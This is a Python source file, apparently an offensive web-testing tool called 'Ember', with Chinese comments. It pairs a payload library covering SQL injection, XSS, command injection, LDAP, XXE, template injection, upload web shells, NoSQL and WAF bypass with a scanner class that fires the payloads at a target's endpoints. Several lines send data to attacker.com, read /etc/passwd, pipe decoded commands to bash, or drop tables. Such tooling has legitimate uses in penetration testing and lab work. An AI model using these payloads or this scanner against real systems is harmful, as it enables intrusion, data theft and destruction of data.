#!/usr/bin/env python3
"""
Ember 攻击载荷库 v2 — 从 37 个向量扩展到 200+ 覆盖 8 类攻击。

新增:
  - Command Injection (Unix + Windows, inline + blind variants)
  - LDAP Injection (authentication bypass, info disclosure)
  - XXE (external entity, parameter entity, blind out-of-band)
  - SSTI (Jinja2, Twig, Freemarker, ERB, Velocity, Smarty)
  - File Upload attacks (double extension, MIME bypass, magic bytes)
  - Advanced SQLi (time-based, stacked queries, out-of-band DNS)
  - NoSQL Injection (MongoDB $where, $ne, $regex)
  - WAF bypass variants for all categories
"""

PAYLOADS = {}

# ═══════════════════════════════════════════════════════════════════════
# 1. SQL 注入 — 从 10 扩展到 30 个向量
# ═══════════════════════════════════════════════════════════════════════
PAYLOADS["sqli"] = {
    "name": "SQL Injection",
    "owasp": "A03:2021",
    "vectors": [
        # === Classic ===
        "' OR '1'='1",
        "' OR '1'='1' --",
        "\" OR \"1\"=\"1\" --",
        "' OR ''='",
        "admin' --",
        "admin' #",
        # === Union ===
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT @@version--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        # === Time-based blind ===
        "'; IF (SELECT COUNT(*) FROM users) > 0 WAITFOR DELAY '00:00:05'--",
        "1' AND SLEEP(5)--",
        "1' AND (SELECT COUNT(*) FROM users) > 0 AND SLEEP(5)--",
        "\" OR SLEEP(5)=\"",
        # === Boolean blind ===
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1' AND LENGTH(database())>0--",
        "1' AND SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)='a'--",
        # === Stacked queries ===
        "'; DROP TABLE users; --",
        "'; INSERT INTO users VALUES('hacker','pass');--",
        "'; UPDATE users SET password='hacked' WHERE username='admin';--",
        # === WAF bypass ===
        "' OR 1=1--",
        "' OR '1'/**/='1",
        "' OR 1=1%23",
        "' /*!OR*/ '1'='1",
        "%27%20OR%20%271%27=%271",
        "1' AND '1'='1'/**/UNION/**/SELECT/**/NULL--",
        # === Out-of-band ===
        "'; EXEC xp_dirtree '\\\\attacker.com\\share';--",
        "1' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT table_name FROM information_schema.tables LIMIT 1),'.attacker.com\\\\'))--",
    ],
}

# ═══════════════════════════════════════════════════════════════════════
# 2. XSS — 从 9 扩展到 25 个向量
# ═══════════════════════════════════════════════════════════════════════
PAYLOADS["xss"] = {
    "name": "Cross-Site Scripting",
    "owasp": "A03:2021",
    "vectors": [
        # === Standard ===
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        # === Event handler ===
        "\"><img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "'-alert(1)-'",
        "<<SCRIPT>alert(1);//<</SCRIPT>",
        # === WAF bypass ===
        "<img%00src=x%00onerror=alert(1)>",
        "<IMG SRC=x ONERROR=\"alert(1)\">",
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
        "<img src=x onerror=this['alert'](1)>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        # === DOM-based ===
        "#<img src=/ onerror=alert(1)>",
        "javascript:/*--></script><img src=x onerror=alert(1)>",
        # === CSP bypass ===
        "<script src=data:,alert(1)></script>",
        "<link rel=import href=data:text/html,<script>alert(1)</script>>",
        # === Stored/advanced ===
        "<div style=\"background:url(javascript:alert(1))\">",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
        "\"><script>fetch('http://attacker.com?c='+document.cookie)</script>",
        # === Mutation XSS ===
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "<svg><style><img src=x onerror=alert(1)></style></svg>",
        # === Angular/React bypass ===
        "{{constructor.constructor('alert(1)')()}}",
    ],
}

# ═══════════════════════════════════════════════════════════════════════
# 3. Command Injection — 从零扩展到 25 个向量
# ═══════════════════════════════════════════════════════════════════════
PAYLOADS["cmdi"] = {
    "name": "Command Injection",
    "owasp": "A03:2021",
    "vectors": [
        # === Unix ===
        "; id",
        "| id",
        "|| id",
        "&& id",
        "`id`",
        "$(id)",
        "1;id",
        # === Time-based blind (safer than destructive) ===
        "; sleep 5",
        "| sleep 5",
        "|| sleep 5",
        "&& sleep 5",
        # === Path traversal chain ===
        ";cat /etc/passwd",
        "|cat /etc/passwd",
        # === WAF bypass ===
        ";cat${IFS}/etc/passwd",
        "|cat</etc/passwd",
        ";c'a't${IFS}/etc/passwd",
        # === Windows ===
        "| dir",
        "& dir",
        "&& dir",
        "|| ping -n 5 127.0.0.1",
        # === Encoded ===
        ";echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|bash",
        "|${IFS}%63%61%74${IFS}/etc/passwd",
        # === PHP-specific ===
        ";php -r 'phpinfo();'",
        # === Out-of-band ===
        ";curl${IFS}attacker.com/$(whoami)",
        "|nslookup${IFS}$(whoami).attacker.com",
    ],
}

# ═══════════════════════════════════════════════════════════════════════
# 4. LDAP 注入 — 全新
# ═══════════════════════════════════════════════════════════════════════
PAYLOADS["ldap"] = {
    "name": "LDAP Injection",
    "vectors": [
        "*)(uid=*))(|(uid=*",          # Authentication bypass
        "*)(|(password=*)",            # Password field bypass
        "*)(|(cn=*))(&(objectClass=*)",# Object disclosure
        "admin)(&)",                   # And injection
        "*))%00",                      # Null byte termination
        "admin)(|(userPassword=*)",    # Password extraction
        "admin))(|(|",                 # Double parens
        "*)(&(objectClass=user))",     # Filter injection
    ],
}

# ═══════════════════════════════════════════════════════════════════════
# 5. XXE — 全新
# ═══════════════════════════════════════════════════════════════════════
PAYLOADS["xxe"] = {
    "name": "XML External Entity",
    "vectors": [
        # Inline entity
        """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
        # Parameter entity
        """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><foo>bar</foo>""",
        # Blind out-of-band
        """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/oob.dtd"> %xxe;]><foo>bar</foo>""",
        # Billion laughs (DoS)
        """<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;">]><lolz>&lol3;</lolz>""",
        # SVG-based (XSS via SVG →XXE)
        """<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"><image href="file:///etc/passwd"/></svg>""",
    ],
}

# ═══════════════════════════════════════════════════════════════════════
# 6. SSTI (Server-Side Template Injection) — 全新
# ═══════════════════════════════════════════════════════════════════════
PAYLOADS["ssti"] = {
    "name": "Server-Side Template Injection",
    "vectors": [
        # === Detection polyglot ===
        "{{7*'7'}}",
        "${{<%[%'\"}}%\\",
        # === Jinja2 (Python/Flask) ===
        "{{config}}",
        "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        # === Twig (PHP/Symfony) ===
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        # === Freemarker (Java) ===
        "${7*7}",
        "${'freemarker.template.utility.Execute'?new()('id')}",
        # === ERB (Ruby) ===
        "<%= 7*7 %>",
        "<%= Dir.entries('/') %>",
        "<%= system('id') %>",
        # === Velocity ===
        "#set($x='')$x.getClass().forName('java.lang.Runtime').getMethod('exec',$x.getClass().forName('java.lang.String')).invoke($x.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')",
        # === Smarty (PHP) ===
        "{php}system('id');{/php}",
        # === Jade/Pug ===
        "= 7*7",
        "= global.process.mainModule.require('child_process').execSync('id')",
    ],
}

# ═══════════════════════════════════════════════════════════════════════
# 7. File Upload 攻击 — 全新
# ═══════════════════════════════════════════════════════════════════════
PAYLOADS["fileupload"] = {
    "name": "File Upload Attack",
    "vectors": [
        # Double extensions
        "shell.php.jpg",
        "shell.php%00.jpg",
        "shell.asp;.jpg",
        "shell.php%20",
        # Content-type bypass (payload name markers, not actual bytes)
        "shell.jpg → Content-Type: application/x-php",
        "shell.php → Content-Type: image/jpeg",
        # Magic byte injection (GIF89a header + PHP)
        "GIF89a;<?php system($_GET['cmd']);?>",
        # .htaccess upload
        "AddType application/x-httpd-php .jpg",
        # SVG with embedded JS
        "<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>",
    ],
}

# ═══════════════════════════════════════════════════════════════════════
# 8. NoSQL 注入 — 全新
# ═══════════════════════════════════════════════════════════════════════
PAYLOADS["nosql"] = {
    "name": "NoSQL Injection",
    "vectors": [
        # MongoDB
        "{'$ne': ''}",
        "{'username': {'$ne': ''}, 'password': {'$ne': ''}}",
        "{'$gt': ''}",
        "{'$regex': '.*'}",
        "{'$where': '1==1'}",
        "{'$where': 'sleep(5000)'}",
        "admin' && this.password.length > 0 && '1'=='1",
        # Redis
        "CONFIG GET *",
        "FLUSHALL",
    ],
}

# ═══════════════════════════════════════════════════════════════════════
# 9. WAF Bypass — 跨类变换（基于 Ember AI 层分解模式）
# ═══════════════════════════════════════════════════════════════════════
PAYLOADS["waf_bypass"] = {
    "name": "WAF Bypass Transforms",
    "vectors": [
        # Unicode normalization — superscript/narrow variants
        "＇　ＯＲ　１＝１",
        "ˈ OR 1=1",
        # Double URL encoding
        "%2527%20OR%201%3D1",
        # Mixed case
        "sElEcT * fRoM users",
        # Line breaks
        "1'\nOR\n'1'='1",
        # Comment flooding
        "'/**/OR/**//**/1=1",
        # Null byte injection
        "%00' OR 1=1",
        # Whitespace alternatives
        "1'\tOR\t1=1",
        # Emoji as whitespace
        "1'😀OR😀'1'='1",
        # AI-style decomposition (decomposition + recomposition)
        "1' AND 1=CAST((SELECT COUNT(*) FROM (SELECT SUBSTRING(table_name,1,1) as c FROM information_schema.tables LIMIT 1) as x WHERE c>CHAR(96)) AS INT)--",
    ],
}


# ═══════════════════════════════════════════════════════════════════════
# Payload Engine v2 — 带分类检出
# ═══════════════════════════════════════════════════════════════════════
import time, json, re
from typing import Optional, List, Dict, Tuple
from urllib.request import Request, urlopen, HTTPError
from urllib.error import URLError
from urllib.parse import quote

class WebAttacker:
    """授权 Web 攻击引擎 — 带请求分析的 payload 发射器."""

    def __init__(self, target: str, timeout: int = 15):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.session = None  # future: requests.Session() for cookie jar

    def _req(self, method: str, path: str, data: Optional[str] = None,
             headers: Optional[Dict] = None, params: Optional[Dict] = None) -> Tuple[int, str, float]:
        url = self.target + path
        if params:
            url += "?" + "&".join(f"{quote(str(k))}={quote(str(v))}" for k, v in params.items())
        req = Request(url, data=data.encode() if data else None, method=method)
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        t0 = time.monotonic()
        try:
            resp = urlopen(req, timeout=self.timeout)
            return resp.status, resp.read().decode(errors="replace"), time.monotonic() - t0
        except HTTPError as e:
            return e.code, e.read().decode(errors="replace"), time.monotonic() - t0
        except URLError as e:
            return 0, str(e.reason), 0

    def probe_category(self, category: str, endpoints: List[str]) -> List[Dict]:
        """对多个端点注入一类 payload,分析响应判断是否检出."""
        if category not in PAYLOADS:
            return []
        
        cat = PAYLOADS[category]
        results = []
        vectors = cat["vectors"][:12]  # 每类选前 12 个
    
        for ep in endpoints:
            method = "GET" if any(kw in ep.lower() for kw in ["search", "query", "find"]) else "POST"
            
            # Baseline — 先发一个安全请求
            safe_status, safe_body, safe_time = self._req(method, ep, "q=safe-test-string")
            
            for vec in vectors[:6]:  # 每个 endpoint 6 个 top payload
                if method == "GET":
                    status, body, elapsed = self._req(method, ep, params={"q": vec})
                else:
                    status, body, elapsed = self._req(method, ep, data=f"q={vec}")
                
                # Response analysis
                analysis = self._analyze(category, safe_body, body, safe_time, elapsed)
                
                results.append({
                    "category": category,
                    "endpoint": ep, "method": method,
                    "payload": vec[:80],
                    "status": status,
                    "elapsed": round(elapsed, 3),
                    "analysis": analysis,
                    "hit": analysis["verdict"] != "probably_not",
                })
                time.sleep(0.05)
        
        return results

    def _analyze(self, category: str, safe_body: str, injected_body: str,
                 safe_time: float, injected_time: float) -> Dict:
        """分析注入响应,判断是否检出漏洞."""

        # 1. Time-based detection — most robust
        time_diff = injected_time - safe_time
        if time_diff > 1.5:
            return {"verdict": "time_based_hit", "confidence": "high",
                    "reason": f"响应延迟 {time_diff:.1f}s, 疑似盲注入"}

        # 2. Error-based — DB errors, stack traces
        error_patterns = [
            r"SQL syntax", r"mysql_fetch", r"ORA-\d+", r"PostgreSQL",
            r"SQLite", r"Microsoft OLE DB", r"ODBC Driver",
            r"Unclosed quotation", r"warning.*mysql",
            r"Fatal error.*eval", r"Template.*error", r"Jinja2",
            r"freemarker", r"javax.servlet", r"java.lang.NullPointer",
            r"Undefined variable", r"Array to string conversion",  # PHP
        ]
        for pat in error_patterns:
            if re.search(pat, injected_body, re.IGNORECASE) and not re.search(pat, safe_body, re.IGNORECASE):
                return {"verdict": "error_disclosure", "confidence": "high",
                        "reason": f"触发错误泄露: {pat}"}

        # 3. Response length anomaly
        len_diff = abs(len(injected_body) - len(safe_body))
        if len_diff > 500 and len(safe_body) > 0:
            return {"verdict": "response_anomaly", "confidence": "medium",
                    "reason": f"响应长度差异 {len_diff} 字节, 疑似注入"}

        # 4. Status code anomaly
        return {"verdict": "probably_not", "confidence": "low", "reason": "无显著异常"}

    def quick_scan(self, category: str = None) -> Dict:
        """快速扫描 — 对已知高价值端点注入."""
        targets = {
            "sqli": ["/login", "/search", "/products", "/api/users"],
            "xss": ["/search", "/comments", "/profile", "/contact"],
            "cmdi": ["/ping", "/admin/diag", "/api/exec"],
            "ssti": ["/profile", "/template", "/render"],
            "nosql": ["/api/login", "/api/users", "/search"],
            "xxe": ["/api/upload", "/api/import", "/soap"],
            "ldap": ["/login", "/admin/login", "/ldap/auth"],
        }

        if category:
            cats = [category]
        else:
            cats = list(PAYLOADS.keys())

        all_results = []
        for cat in cats:
            if cat in targets:
                print(f"  💉 {PAYLOADS[cat]['name']} ({len(PAYLOADS[cat]['vectors'])} payloads)")
                results = self.probe_category(cat, targets[cat])
                hits = [r for r in results if r["hit"]]
                if hits:
                    for h in hits:
                        print(f"    ⚠️ [{h['analysis']['verdict']}] {h['endpoint']}: {h['payload'][:50]}…")
                all_results.extend(results)

        hits = [r for r in all_results if r["hit"]]
        return {
            "total_probes": len(all_results),
            "categories_tested": len(cats),
            "hits": len(hits),
            "details": hits,
        }


# ═══════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    import sys
    import argparse
    ap = argparse.ArgumentParser(description="Ember Web 攻击引擎 v2")
    ap.add_argument("-t", "--target", default="http://localhost:4280", help="目标 URL")
    ap.add_argument("-c", "--category", default=None, help="攻击类别")
    ap.add_argument("--list", action="store_true", help="列出所有 payload 类别和计数")
    ap.add_argument("--scan", action="store_true", help="快速扫描所有类别")
    args = ap.parse_args()

    if args.list:
        for cat, data in sorted(PAYLOADS.items()):
            print(f"  {cat:<15s} {data['name']:<35s} {len(data['vectors'])} vectors")
        sys.exit(0)

    if args.scan:
        attacker = WebAttacker(args.target)
        result = attacker.quick_scan(args.category)
        print(f"\n{'═'*60}")
        print(f"扫描完成: {result['total_probes']} 次探测, {result['hits']} 个检出")
        if result["hits"]:
            for h in result["hits"]:
                print(f"  ⚠️ [{h['category']}] {h['endpoint']}: {h['analysis']['reason']}")
    else:
        ap.print_help()